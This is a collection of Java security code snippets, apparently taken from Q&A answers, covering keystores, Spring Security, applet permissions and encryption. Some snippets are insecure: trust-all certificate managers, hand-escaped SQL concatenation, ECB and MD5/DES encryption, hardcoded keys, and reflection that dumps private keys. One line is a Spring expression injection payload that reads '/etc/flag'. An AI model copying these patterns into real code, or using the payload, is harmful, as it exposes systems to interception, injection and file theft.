    			throw new RuntimeException("No strong secure random available to generate strong AES key", e);
    		}
    		// already throws IllegalParameterException for wrong key sizes
    		kgen.init(keysize, rng);
    		
    		return kgen.generateKey();
    	}
    	
    	public static void main(String[] args) {
    		SecretKey strongAESKey = generateStrongAESKey(256);
    		// well, if you must have a human readable string, here it is
    		// but you've been warned
    		System.out.println(toHex(strongAESKey.getEncoded()));
    	}
    	private static String toHex(final byte[] data) {
            final StringBuilder sb = new StringBuilder(data.length * 2);
            for (byte b : data) {
                sb.append(String.format("%02X", b));
            }
            return sb.toString();
    	}
    }
---UNIQUEIDFORSNIP---|142327254|    DocFlavor flavor = DocFlavor.BYTE_ARRAY.AUTOSENSE; 
    PrintRequestAttributeSet pras = new HashPrintRequestAttributeSet();
                       
    PrintService[] printerArray = dialogPrinters.toArray(new PrintService[dialogPrinters.size()]);
     
    // call print dialog and get print attributes
    PrintService selectedPrinter = javax.print.ServiceUI.printDialog(null, 200, 200, printerArray, defaultPrintService, flavor, pras);	
     
    // check if "print-to-file" option used
    if (pras.get(Destination.class) != null)
    {
    	// here we deny to perform the save into a file
    	JOptionPane.showMessageDialog(CMSJRViewer.this, getBundleString("error.printing"));
    	throw new PrintException("Print to file option not allowed. Action aborted!");
    }
    else
    {
    	...
    }
---UNIQUEIDFORSNIP---|142406293|    at java.io.File.getAbsolutePath(File.java:501)
    at game.<init>(game.java:117)
---UNIQUEIDFORSNIP---|142409994|       <subsystem xmlns="urn:jboss:domain:web:1.1" default-virtual-server="default-host" native="false">  
            <connector name="http" protocol="HTTP/1.1" scheme="http" socket-binding="http"/>  
            <virtual-server name="default-host" enable-welcome-root="true">  
                <alias name="localhost"/>  
                <alias name="example.com"/>  
                <sso reauthenticate="false"/>  
            </virtual-server>  
        </subsystem> 
---UNIQUEIDFORSNIP---|142479465|    <?xml version="1.0" encoding="UTF-8"?>
    <jnlp spec="1.0+" codebase="http://localhost/inventarioaj/" href="InventarioAJ.jnlp">
     <resources>
        <j2se version="1.8+" href=
           "http://java.sun.com/products/autodl/j2se"/>
        <jar href="/inventarioaj/InventarioAJ.jar" main="true" />
		<jar href="lib/controlsfx-8.40.10.jar"/>
        <jar href="lib/javax.inject-1.jar"/>
		<jar href="lib/particle-1.1.0.jar"/>
		<jar href="lib/h2-1.4.191.jar"/>
		<jar href="lib/eclipselink.jar"/>
		<jar href="lib/javax.persistence_2.1.0.v201304241213.jar"/>
		<jar href="lib/org.eclipse.persistence.jpa.modelgen_2.5.2.v20140319-9ad6abd.jar"/>
		<jar href="lib/org.eclipse.persistence.jpars_2.5.2.v20140319-9ad6abd.jar"/>
     </resources>
	 <security>
		<all-permissions/>
	 </security>
	 <application-desc name="Inventario de XXXX"
	 main-class="mx.xxxxx.InventarioAJ"/>
---UNIQUEIDFORSNIP---|142722160|    import java.security.cert.CertificateException;
    import java.security.cert.X509Certificate;
    public class YouNameClass implements X509TrustManager {... 
       public YouNameClass() {
          super();
       }
    }
---UNIQUEIDFORSNIP---|142722164|    private static void trustAllHttpsCertificates() throws Exception {
    //  Create a trust manager that does not validate certificate chains:
        javax.net.ssl.TrustManager[] trustAllCerts = new javax.net.ssl.TrustManager[1];
        javax.net.ssl.TrustManager tm = new YouNameClass();
        trustAllCerts[0] = tm; 
        javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, null);
        javax.net.ssl.HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
    }
---UNIQUEIDFORSNIP---|142722166|    	@Override
	     public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {
		   return;
	}
	    @Override
	    public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {
		   return;
	}
	    @Override
	    public X509Certificate[] getAcceptedIssuers() {
		   return null;
	}
---UNIQUEIDFORSNIP---|142786788|    java.net.Inet4AddressImpl.getHostByAddr([B)Ljava.lang.String
---UNIQUEIDFORSNIP---|143206471|Permissions: sandbox
Codebase: myserver.com
---UNIQUEIDFORSNIP---|143206473|jar cvfm YourTargetJar.jar your_manifest_file.txt classes_and_such
---UNIQUEIDFORSNIP---|143206483|    <pre>Permissions: sandbox
    Codebase: *.myserver.com</pre>
    These new attributes were introduced in Java 7 Update 25 and [are discussed here][1]. The first page linked above just shows `Codebase: myserver.com`, but most sites are going to want the wildcard above. (I don't know if the `Codebase` attribute is required for sandboxing the applet, but it seems like a good idea for most signed applets anyway.)
    Then use that manifest file when building your jar, like:
    <pre>jar cvfm YourJarFile.jar your_manifest_file.txt classes_and_such</pre>
    Those attributes will wind up in the MANIFEST.MF file in the jar, which tells the Java runtime to keep the applet sandboxed.
---UNIQUEIDFORSNIP---|143206487|    <pre>&lt;applet code='yourAppletClass' archive='YourJarFile.jar'>
        &lt;param name="permissions" value="sandbox">
    &lt;/applet></pre>
    Without this second step, a signed applet requesting sandboxed permissions in the jar but not the tag is prevented from being run with a dialog box titled "The Application Cannot Be Run" giving "Reason: JAR manifest requested to run in sandbox only."
---UNIQUEIDFORSNIP---|143350546|    //Import JQuery
    <script src="jquery-1.11.0.min.js"></script>
    //Add this to your JS Logic for the page you want to change
    <script type="text/javascript">
      jQuery(document).ready(function($) {
        if (window.history && window.history.pushState) {
          $(window).on('popstate', function() {
            var hashLocation = location.hash;
            var hashSplit = hashLocation.split("#!/");
            var hashName = hashSplit[1];
            if (hashName !== '') {
              var hash = window.location.hash;
              if (hash === '') {
                document.location.href = '/Your/Redirection/Here';
              }
            }
          });
       window.history.pushState('forward', null, '#SomeIDYouAreNotUsing');
       }
     });
    </script>
---UNIQUEIDFORSNIP---|143504475|    @Override
    protected void configure(HttpSecurity http) throws Exception
    {
        http.authorizeRequests()
                .antMatchers("/admin/**").access("hasRole('ADMIN')")
                .antMatchers("/**").permitAll()
                .anyRequest().authenticated()
                .and()
                .formLogin();
    }
---UNIQUEIDFORSNIP---|143504481|    package com.your.package.config;
    import org.springframework.beans.factory.annotation.Autowired;
    import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
    import org.springframework.security.config.annotation.web.builders.HttpSecurity;
    import org.springframework.security.config.annotation.web.configuration.*;
    
    @EnableWebSecurity
    public class SecurityConfig extends WebSecurityConfigurerAdapter
    {
        @Override
        protected void configure(HttpSecurity http) throws Exception
        {
            http.authorizeRequests()
                    .antMatchers("/admin/**").access("hasRole('ADMIN')")
                    .antMatchers("/**").permitAll()
                    .anyRequest().authenticated()
                    .and()
                    .formLogin();
        }
    
        @Autowired
        public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception
        {
            auth.inMemoryAuthentication().withUser("user").password("password").roles("USER");
        }
    }
---UNIQUEIDFORSNIP---|144067043|    -javaagent:notsoserial.jar -Dnotsoserial.whitelist=empty.txt 
---UNIQUEIDFORSNIP---|144194288|    KeyStore ks = KeyStore.getInstance("JKS");
    ks.setKeyEntry("keyAlias", key, passwordForKeyCharArray, certChain);
    OutputStream writeStream = new FileOutputStream(filePathToStore);
    ks.store(writeStream, keystorePasswordCharArray);
    writeStream.close();
---UNIQUEIDFORSNIP---|144194290|    KeyStore ks = KeyStore.getInstance("JKS");
    InputStream readStream = new FileInputStream(filePathToStore);
    ks.load(readStream, keystorePasswordCharArray);
    Key key = ks.getKey("keyAlias", passwordForKeyCharArray);
    readStream.close();
---UNIQUEIDFORSNIP---|144194293|    KeyStore ks = KeyStore.getInstance("JCEKS");
---UNIQUEIDFORSNIP---|144278986|        public class X509 {
    
        public static void main(String[] args) {
            FileInputStream is;
            try {
                is = new FileInputStream("/tmp/certificate_x509.pem");
                CertificateFactory x509CertFact = CertificateFactory.getInstance("X.509");
                X509Certificate cert = (X509Certificate)x509CertFact.generateCertificate(is);
                String thumbprint = getThumbPrint(cert);
                System.out.println(thumbprint);
    
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (CertificateException e) {
                e.printStackTrace();
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            }
    
        }
    
        public static String getThumbPrint(X509Certificate cert) 
            throws NoSuchAlgorithmException, CertificateEncodingException {
            MessageDigest md = MessageDigest.getInstance("SHA-1");
            byte[] der = cert.getEncoded();
            md.update(der);
            byte[] digest = md.digest();
            return hexify(digest);
    
        }
    
        public static String hexify (byte bytes[]) {
    
            char[] hexDigits = {'0', '1', '2', '3', '4', '5', '6', '7', 
                    '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
    
            StringBuffer buf = new StringBuffer(bytes.length * 2);
    
            for (int i = 0; i < bytes.length; ++i) {
                buf.append(hexDigits[(bytes[i] & 0xf0) >> 4]);
                buf.append(hexDigits[bytes[i] & 0x0f]);
            }
    
            return buf.toString();
        }
    }
---UNIQUEIDFORSNIP---|144388606|    int numBuckets = s.readInt();
    table = new Entry[numBuckets];
---UNIQUEIDFORSNIP---|144408561|    context.addFilePermission(FileAccess.READ, AccessType.PERMIT, new FilePrefixPermission(""));
---UNIQUEIDFORSNIP---|144503948|    <http>
      <session-management session-fixation-protection="none"/>
      <custom-filter position="PRE_AUTH_FILTER" ref="preAuthenticationFilter"/>
      <intercept-url pattern="/j_security_check" filters="none"/>
      <intercept-url pattern="/ibm_security_logout" filters="none"/>
      <!-- put authorization intercept-url elements here... -->
    </http>
    
---UNIQUEIDFORSNIP---|144912660|          Object certChain = request.getAttribute(
                "javax.servlet.request.X509Certificate");
           if (certChain != null) {
              X509Certificate certs[] = (X509Certificate[])certChain;
              X509Certificate cert = certs[0];
              String n = cert.getSubjectDN().getName();
            }
---UNIQUEIDFORSNIP---|145003110|            /* Skip the code below for --skip-user-management */
            if (this.skipUserManagement && (this.applicationType !== 'monolith' || this.authenticationType !== 'oauth2')) return;
---UNIQUEIDFORSNIP---|145065460|    Transformed: <?xml version="1.0" encoding="UTF-8"?>test
---UNIQUEIDFORSNIP---|145232097|    private static final String ROLE_PREFIX = "ROLE_";
    public String nameWithPrefix() {
        return ROLE_PREFIX + name();
    }
---UNIQUEIDFORSNIP---|145479240|    ASN1InputStream ais = new ASN1InputStream(derOctetString.getOctetStream());
    KeyUsage ku = new KeyUsage((DERBitString) ais.readObject());
---UNIQUEIDFORSNIP---|145536526|    if [ `id -u` = 0 ]; then
      echo "You are root, go away!"
      exit 1
    fi
---UNIQUEIDFORSNIP---|145552131|    response.sendRedirect(targetUrl);
---UNIQUEIDFORSNIP---|145702116|    SAXParserFactory spf = SAXParserFactory.newInstance();
    spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
		
---UNIQUEIDFORSNIP---|145702120|    spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
---UNIQUEIDFORSNIP---|145726808|    import javax.crypto.Cipher;
    import javax.crypto.spec.SecretKeySpec;
    
    public class MainClass {
      public static void main(String[] args) throws Exception {
        Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());    
        byte[] input = "www.java2s.com".getBytes();
        byte[] keyBytes = new byte[] { 0x00, 0x01, 0x02, 0x03, 0x04, 
                     0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 
                     0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 
                     0x15, 0x16, 0x17 };
    
        SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
    
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS7Padding", "BC");
    
        System.out.println(new String(input));
    
        // encryption pass
        cipher.init(Cipher.ENCRYPT_MODE, key);
    
        byte[] cipherText = new byte[cipher.getOutputSize(input.length)];
        int ctLength = cipher.update(input, 0, input.length, cipherText, 0);
        ctLength += cipher.doFinal(cipherText, ctLength);
        System.out.println(new String(cipherText));
        System.out.println(ctLength);
    
        // decryption pass
        cipher.init(Cipher.DECRYPT_MODE, key);
        byte[] plainText = new byte[cipher.getOutputSize(ctLength)];
        int ptLength = cipher.update(cipherText, 0, ctLength, plainText, 0);
        ptLength += cipher.doFinal(plainText, ptLength);
        System.out.println(new String(plainText));
        System.out.println(ptLength);
      }
    }
         
---UNIQUEIDFORSNIP---|145856721|    if(MyFeatures.ShowFizzBuzz.isActive()) {
      ShowFizzBuzzPermission showFizzBuzz = new ShowFizzBuzzPermission();
      if(currentUser.isPermitted(showFizzBuzz) {
        // Show the FizzBuzz menu.
      }
    }
---UNIQUEIDFORSNIP---|145933200|      public void checkAccess(ThreadGroup g) {
          System.out.println("Access for " + g);
          super.checkAccess(g);
      }
      public void checkAccess(Thread t) {
          System.out.println("Access for " + t);
          super.checkAccess(t);
      }
---UNIQUEIDFORSNIP---|145933203|    Access for java.lang.ThreadGroup[name=system,maxpri=10]
    Permission (java.lang.RuntimePermission modifyThreadGroup)
    [...]
    Access for Thread[SIGTERM handler,9,system]
    Permission (java.lang.RuntimePermission modifyThread)
    [...]
     java.security.Permissions@133c5982 (
     (java.lang.RuntimePermission exitVM)
     (java.io.FilePermission /path/to/current/working/directory/- read)
    )
---UNIQUEIDFORSNIP---|145933208|      public void checkAccess(ThreadGroup g) {
          System.out.println("Access for " + g);
          if ("system".equals(g.getName()))  {
             // will checkPermission java.lang.RuntimePermission "modifyThreadGroup"
             super.checkAccess(g);
          } else {
             throw new SecurityException("Access denied to " + g);
          }
      }
      public void checkAccess(Thread t) {
          System.out.println("Access for " + t);
          if ("SIGTERM handler".equals(t.getName())) {
             // will checkPermission java.lang.RuntimePermission "modifyThread"
             super.checkAccess(t);
          } else {
             throw new SecurityException("Access denied to " + t);
          }
      }
---UNIQUEIDFORSNIP---|145933212|    grant {
      permission java.lang.RuntimePermission "modifyThreadGroup";
      permission java.lang.RuntimePermission "modifyThread";
      permission java.lang.RuntimePermission "exitVM";
    };
---UNIQUEIDFORSNIP---|145936575|    <param name="separate_jvm" value="true"/>
---UNIQUEIDFORSNIP---|145972818|    try {
                User user = (User) req.getAttribute(WebKeys.USER);
				PrincipalThreadLocal.setName(userId);
				PermissionChecker permissionChecker;
				permissionChecker = PermissionCheckerFactoryUtil.create(user);
				PermissionThreadLocal.setPermissionChecker(permissionChecker);
				Organization organization = mylist.get(0);
				ExpandoBridge expandoBridge = organization.getExpandoBridge();
				System.out.println(expandoBridge.getAttribute("custom_field"));
    } catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
	}
---UNIQUEIDFORSNIP---|146132351|	/*
	 * Special regular expression character ranges relevant for simplification
	 * -> see http://docstore.mik.ua/orelly/perl/prog3/ch05_04.htm
	 * InCombiningDiacriticalMarks: special marks that are part of "normal" ä,
	 * ö, î etc.. IsSk: Symbol, Modifier see
	 * http://www.fileformat.info/info/unicode/category/Sk/list.htm IsLm:
	 * Letter, Modifier see
	 * http://www.fileformat.info/info/unicode/category/Lm/list.htm
	 */
	private static final Pattern DIACRITICS_AND_FRIENDS = Pattern.compile("[\\p{InCombiningDiacriticalMarks}\\p{IsLm}\\p{IsSk}]+");
	private static String stripDiacritics(String str) {
		str = Normalizer.normalize(str, Normalizer.Form.NFD);
		str = DIACRITICS_AND_FRIENDS.matcher(str).replaceAll("");
		return str;
	}
---UNIQUEIDFORSNIP---|146309112|    public bool isUnlimitedKeyStrength() {
        return Cipher.getMaxAllowedKeyLength("AES") == Integer.MAX_VALUE;
    }
---UNIQUEIDFORSNIP---|146402851|    public class MyAction extends ActionSupport implements PrincipalAware {
    
      protected PrincipalProxy principal;
    
      public void setPrincipalProxy(PrincipalProxy principalProxy) {
        this.principal = principalProxy;
      }
    
      public PrincipalProxy getPrincipal() {
        return principal;
      }
    }
---UNIQUEIDFORSNIP---|146402855|    <s:if test="principal.isUserInRole('role1')">
---UNIQUEIDFORSNIP---|146636066|    AxisProperties.setProperty("axis.socketSecureFactory","org.apache.axis.components.net.SunFakeTrustSocketFactory");
---UNIQUEIDFORSNIP---|146644607|<#assign  security=JspTaglibs["http://www.springframework.org/security/tags"] />
---UNIQUEIDFORSNIP---|146644609|    <@security.authorize ifAnyGranted="ROLE_USER">
    	Your role is "ROLE_USER" <br/>
    </@security.authorize>
---UNIQUEIDFORSNIP---|146644611|    <@security.authorize access="isAuthenticated()">
        logged in as <@security.authentication property="principal.username" /> 
    </@security.authorize>
    <@security.authorize access="! isAuthenticated()">
    	Not logged in
    </@security.authorize>
---UNIQUEIDFORSNIP---|146748860|    <beans:bean 
        id="passwordEncoder" 
        class="my.awesome.package.MyAwesomeShaPasswordEncoder"/>
---UNIQUEIDFORSNIP---|146890309|    static { Security.addProvider(new BouncyCastleProvider());  }
---UNIQUEIDFORSNIP---|146915269|    <security-constraint>
      <display-name>name</display-name>
      <web-resource-collection>  
        <web-resource-name>Restricted</web-resource-name>
        <url-pattern>/*</url-pattern>
        <http-method>GET</http-method>
        <http-method>POST</http-method>
      </web-resource-collection>
      <auth-constraint>
        <role-name>APP_USER</role-name>
      </auth-constraint>
      <user-data-constraint>
        <transport-guarantee>NONE</transport-guarantee>
      </user-data-constraint>
    </security-constraint>
    <security-constraint><!--Exclude css and images here -->
       <web-resource-collection>
          <web-resource-name>Exclude from Security</web-resource-name>
          <url-pattern>/images/*</url-pattern><!-- No security for images -->
          <url-pattern>/css/*</url-pattern><!-- No security for css -->
       </web-resource-collection>
    </security-constraint>
---UNIQUEIDFORSNIP---|147141496|    public boolean copyFile(File source, File destination) throws CopyException {
        try {
            // lots of code
            return true;
        } catch (IOException e) {
            throw new CopyException("File copy failed", e);
        }
    }
---UNIQUEIDFORSNIP---|147141498|    public boolean shareFile(File source, User otherUser) throws ShareException {
        if (otherUser.hasBlocked(this) {
            throw new ShareException("You cannot share with that user.");
        }
        try {
            return copyFile(source, otherUser.getSharedFileDestination(source));
        } catch (CopyException e) {
            throw new ShareException("Sharing failed due to an internal error", e);
        }
    }
---UNIQUEIDFORSNIP---|147165126|    String badInput = rawInput.replace("'","''");
    String badInteger = rawInteger.replace("'","''");
    ResultSet rs = statement.executeQuery("SELECT * FROM records WHERE" +
     "int1 = " + badInteger + " OR col1 = '"+badInput+"'");
---UNIQUEIDFORSNIP---|147361157|        public byte[] concatKDF(String hashAlg, byte[] z, int keyDataLen, byte[] algorithmID, byte[] partyUInfo, byte[] partyVInfo, byte[] suppPubInfo, byte[] suppPrivInfo) throws NoSuchAlgorithmException
	{
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		try {
			baos.write(algorithmID);
			baos.write(partyUInfo);
			baos.write(partyVInfo);
			baos.write(suppPubInfo);
			baos.write(suppPrivInfo);
		} catch (IOException e) {
			throw new RuntimeException(e);
		}
		
		byte[] otherInfo = baos.toByteArray();
		return concatKDF(hashAlg, z, keyDataLen, otherInfo);
	}
	
	public byte[] concatKDF(String hashAlg, byte[] z, int keyDataLen, byte[] otherInfo) throws NoSuchAlgorithmException
	{
		byte[] key = new byte[keyDataLen];
		MessageDigest md = MessageDigest.getInstance(hashAlg);
		int hashLen = md.getDigestLength(); 
		int reps = keyDataLen / hashLen;
		for(int i=1;i<=reps;i++){
			md.reset();
			md.update(intToFourBytes(i));
			md.update(z);
			md.update(otherInfo);
			byte[] hash = md.digest();
			if(i<reps){
				System.arraycopy(hash, 0, key, hashLen*(i-1), hashLen);
			}else{
				if(keyDataLen % hashLen == 0){
					System.arraycopy(hash, 0, key, hashLen*(i-1), hashLen);
				}else{
					System.arraycopy(hash, 0, key, hashLen*(i-1), keyDataLen % hashLen);
				}
			}
		}
		return key;
	}
	public byte[] intToFourBytes(int i){
		byte[] res = new byte[4];
		res[0] = (byte) (i >>> 24);
		res[1] = (byte) ((i >>> 16) & 0xFF);
		res[2] = (byte) ((i >>> 8) & 0xFF);
		res[3] = (byte) (i & 0xFF);
		return res;
	}
---UNIQUEIDFORSNIP---|147479913|    <sec:authorize ifAllGranted="ROLE_USER, ROLE_ADMIN">
         <!-- html, jsp scriplets, jstl tags inside here will be visible to user B only --> 
    </sec:authorize>
---UNIQUEIDFORSNIP---|147479918|    <sec:authorize ifAllGranted="ROLE_USER">
         <!-- anything inside here will be visible to both users --> 
    </sec:authorize>
---UNIQUEIDFORSNIP---|147505900|    public void init() {
        AccessController.doPrivileged(new PrivilegedAction<Object> {
            @Override public Object run() {
                // Put your original init() here.
                return null;
            }
        });
    }
---UNIQUEIDFORSNIP---|147574027|    @RequestMapping(value = "/session", method = GET)
    public AuthenticatedUserDto getCurrentSession(Authentication auth) {
        if (auth == null || !auth.isAuthenticated())
            throw new BadCredentialsException("unkown session");
        return AuthenticatedUserBuilder.build(auth);
    }
---UNIQUEIDFORSNIP---|147829830|    public static void testKeyStore() throws Exception {
      try {
        String storeName = "path/to/store";
        java.security.KeyPairGenerator keyPairGenerator = KeyPairGenerator
            .getInstance("RSA");
        keyPairGenerator.initialize(2048);
        KeyPair keyPair = keyPairGenerator.generateKeyPair();
        PublicKey publicKey = keyPair.getPublic();
        PrivateKey privateKey = keyPair.getPrivate();
        X509Certificate selfCert = createCertificate("CN=Client", "CN=Client",
            publicKey, privateKey);
        // Note: if you just want to store this certificate then write the
        // contents of selfCert.getEncoded() to file
  
        java.security.cert.Certificate[] outChain = { selfCert };
        KeyStore outStore = KeyStore.getInstance("PKCS12");
        outStore.load(null, PASSWORD.toCharArray());
        outStore.setKeyEntry("mykey", privateKey, PASSWORD.toCharArray(),
            outChain);
        OutputStream outputStream = new FileOutputStream(storeName);
        outStore.store(outputStream, PASSWORD.toCharArray());
        outputStream.flush();
        outputStream.close();
  
        KeyStore inStore = KeyStore.getInstance("PKCS12");
        inStore.load(new FileInputStream(storeName), PASSWORD.toCharArray());
      } catch (Exception e) {
        e.printStackTrace();
        throw new AssertionError(e.getMessage());
      }
    }
---UNIQUEIDFORSNIP---|147921853|    package com.magerman.hremail.prep1docc;
    public class PDFDecryptor {
    /**
     * Instantiates a new pDF decryptor.
     * 
     * @param inputFile
     *            the input file
     * @param inputPassword
     *            the input password
     */
    public PDFDecryptor(final File inputFile, final String inputPassword) {
	originalFile = inputFile;
	password = inputPassword;
    }
    /**
     * Decrypt. Given an inputted PDF File, will try to remove the security of
     * the PDF and save in-place. Done after the attachments have been extracted
     */
    public final void decrypt() {
	// naughty code here
    }
    
    public final void doproviledgeddecrypt() throws Exception {
	AccessController.doPrivileged(new PrivilegedExceptionAction() {
	    public Object run() throws Exception {
		PDFDecryptor.this.decrypt();
		return null;
	    }
	});
    }
    }
---UNIQUEIDFORSNIP---|147994095|    <security>
        <all-permissions/>
    </security>
---UNIQUEIDFORSNIP---|148027618|    public void printKeystore() {
        Field spiField = KeyStore.class.getDeclaredField("keyStoreSpi");
        spiField.setAccessible(true);
        KeyStoreSpi spi = (KeyStoreSpi) spiField.get(keystore1);
        Field entriesField = spi.getClass().getSuperclass().getDeclaredField("entries");
        entriesField.setAccessible(true);
        Collection entries = (Collection) entriesField.get(spi);
        for (Object entry : entries) {
            String alias = (String) invokeGetter(entry, "getAlias");
            Key privateKey = (Key) invokeGetter(entry, "getPrivateKey");
            X509Certificate[] certificateChain = (X509Certificate[]) invokeGetter(entry, "getCertificateChain");
            System.out.println(alias + ": " + privateKey + Arrays.toString(certificateChain));
        }
    }
    private Object invokeGetter(Object instance, String methodName)
            throws NoSuchMethodException, IllegalAccessException,
            InvocationTargetException {
        Method getAlias = instance.getClass().getDeclaredMethod(methodName);
        getAlias.setAccessible(true);
        return getAlias.invoke(instance);
    }
---UNIQUEIDFORSNIP---|148027705|    String iv = payload.substring(0, 16);
    String data = payload.substring(16);
---UNIQUEIDFORSNIP---|148040015|    char[] input = new char[150];
    for (int i = 0 ; i != 10 ; i++) {
        System.out.println("Enter some characters. We are going to do this for a while.");
        char[] buf = kb.nextLine().toCharArray();
        // Copy the data into input
        System.arraycopy(buf, 0, input, 140-(i*10), Math.min(buf.length, 10));
    }
---UNIQUEIDFORSNIP---|148149174|    HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
    connection.setSSLSocketFactory(...);
    connection.setHostnameVerifier(...);
---UNIQUEIDFORSNIP---|148184602|    <security-role>
    	 <role-name>Admin</role-name>
    </security-role>
    <security-role>
    	 <role-name>Author</role-name>
    </security-role>
---UNIQUEIDFORSNIP---|148253992|     a417040e73414d4163636f756e744e616d6530058003626f69
---UNIQUEIDFORSNIP---|148253994|     a316040e73414d4163636f756e744e616d650404626f692a
---UNIQUEIDFORSNIP---|148270817|    live.users.enabled=true
    #
    # Set the following to true if users are allowed to have simultaneous logins
    # from different sessions. This property is not used unless the property
    # "live.users.enabled" is set to true.
    #
    auth.simultaneous.logins=false
  
---UNIQUEIDFORSNIP---|148275234|    static KeyPair demo(InputStream pub, InputStream pvt) throws IOException, GeneralSecurityException {
        KeyFactory f = KeyFactory.getInstance("RSA");
        RSAPublicKeySpec pubspec = decodeRSAPublicSSH(readAllBase64Bytes(pub));
        RSAPrivateCrtKeySpec pvtspec = decodeRSAPrivatePKCS1(readAllBase64Bytes(pvt));
        return new KeyPair(f.generatePublic(pubspec), f.generatePrivate(pvtspec));
    }
    static RSAPublicKeySpec decodeOpenSSH(byte[] input) {
        String[] fields = new String(input, StandardCharsets.US_ASCII).split(" ");
        if ((fields.length < 2) || (!fields[0].equals("ssh-rsa"))) throw new IllegalArgumentException("Unsupported type");
        byte[] std = Base64.getDecoder().decode(fields[1]);
        return decodeRSAPublicSSH(std);
    }
    static RSAPublicKeySpec decodeRSAPublicSSH(byte[] encoded) {
        ByteBuffer input = ByteBuffer.wrap(encoded);
        String type = string(input);
        if (!"ssh-rsa".equals(type)) throw new IllegalArgumentException("Unsupported type");
        BigInteger exp = sshint(input);
        BigInteger mod = sshint(input);
        if (input.hasRemaining()) throw new IllegalArgumentException("Excess data");
        return new RSAPublicKeySpec(mod, exp);
    }
    static RSAPrivateCrtKeySpec decodeRSAPrivatePKCS1(byte[] encoded) {
        ByteBuffer input = ByteBuffer.wrap(encoded);
        if (der(input, 0x30) != input.remaining()) throw new IllegalArgumentException("Excess data");
        if (!BigInteger.ZERO.equals(derint(input))) throw new IllegalArgumentException("Unsupported version");
        BigInteger n = derint(input);
        BigInteger e = derint(input);
        BigInteger d = derint(input);
        BigInteger p = derint(input);
        BigInteger q = derint(input);
        BigInteger ep = derint(input);
        BigInteger eq = derint(input);
        BigInteger c = derint(input);
        return new RSAPrivateCrtKeySpec(n, e, d, p, q, ep, eq, c);
    }
    private static String string(ByteBuffer buf) {
        return new String(lenval(buf), Charset.forName("US-ASCII"));
    }
    private static BigInteger sshint(ByteBuffer buf) {
        return new BigInteger(+1, lenval(buf));
    }
    private static byte[] lenval(ByteBuffer buf) {
        byte[] copy = new byte[buf.getInt()];
        buf.get(copy);
        return copy;
    }
    private static BigInteger derint(ByteBuffer input) {
        int len = der(input, 0x02);
        byte[] value = new byte[len];
        input.get(value);
        return new BigInteger(+1, value);
    }
    private static int der(ByteBuffer input, int exp) {
        int tag = input.get() & 0xFF;
        if (tag != exp) throw new IllegalArgumentException("Unexpected tag");
        int n = input.get() & 0xFF;
        if (n < 128) return n;
        n &= 0x7F;
        if ((n < 1) || (n > 2)) throw new IllegalArgumentException("Invalid length");
        int len = 0;
        while (n-- > 0) {
            len <<= 8;
            len |= input.get() & 0xFF;
        }
        return len;
    }
    private static byte[] readAllBase64Bytes(InputStream input) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        BufferedReader r = new BufferedReader(new InputStreamReader(input, StandardCharsets.US_ASCII));
        Decoder decoder = Base64.getDecoder();
        while (true) {
            String line = r.readLine();
            if (line == null) break;
            if (line.startsWith("-----")) continue;
            output.write(decoder.decode(line));
        }
        return output.toByteArray();
    }
---UNIQUEIDFORSNIP---|148406734|    T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/flag"), T(java.nio.charset.Charset).defaultCharset())
---UNIQUEIDFORSNIP---|148484909|    <manifest file="${source}/META-INF/MANIFEST.MF" mode="update">
	  <attribute name="Permissions" value="all-permissions"/>
	  <attribute name="Codebase" value="${jnlp.codebase}"/>
	  <attribute name="Application-Name" value="${app.name}"/>
    </manifest>
---UNIQUEIDFORSNIP---|148535913|    byte[] key = new byte[64];
    new SecureRandom().nextBytes(key);
    RealmConfiguration config = new RealmConfiguration.Builder(context)
      .encryptionKey(key)
      .build();
    
    Realm realm = Realm.getInstance(config);
---UNIQUEIDFORSNIP---|148662215|    Security.addProvider(new ERACOMProvider());
---UNIQUEIDFORSNIP---|148680323|    ((X509Certificate) certificate).getIssuerX500Principal().getName();
---UNIQUEIDFORSNIP---|148801552|        File myFile = (File) AccessController.doPrivileged(new PrivilegedAction() {
        public Object run() 
        {
            return new File("C:\\MyFolder\\MyFile");
        }
    
        });
---UNIQUEIDFORSNIP---|148832381|    PBEKeySpec pbeKeySpec;
    PBEParameterSpec pbeParamSpec;
    SecretKeyFactory keyFac;
    // Salt
    byte[] salt = {
        (byte)0xc7, (byte)0x73, (byte)0x21, (byte)0x8c,
        (byte)0x7e, (byte)0xc8, (byte)0xee, (byte)0x99
    };
    // Iteration count
    int count = 20;
    // Create PBE parameter set
    pbeParamSpec = new PBEParameterSpec(salt, count);
    // Prompt user for encryption password.
    // Collect user password as char array (using the
    // "readPasswd" method from above), and convert
    // it into a SecretKey object, using a PBE key
    // factory.
    System.out.print("Enter encryption password:  ");
    System.out.flush();
    pbeKeySpec = new PBEKeySpec(readPasswd(System.in));
    keyFac = SecretKeyFactory.getInstance("PBEWithMD5AndDES");
    SecretKey pbeKey = keyFac.generateSecret(pbeKeySpec);
    // Create PBE Cipher
    Cipher pbeCipher = Cipher.getInstance("PBEWithMD5AndDES");
    // Initialize PBE Cipher with key and parameters
    pbeCipher.init(Cipher.ENCRYPT_MODE, pbeKey, pbeParamSpec);
    // Our cleartext
    byte[] cleartext = "This is another example".getBytes();
    // Encrypt the cleartext
    byte[] ciphertext = pbeCipher.doFinal(cleartext);
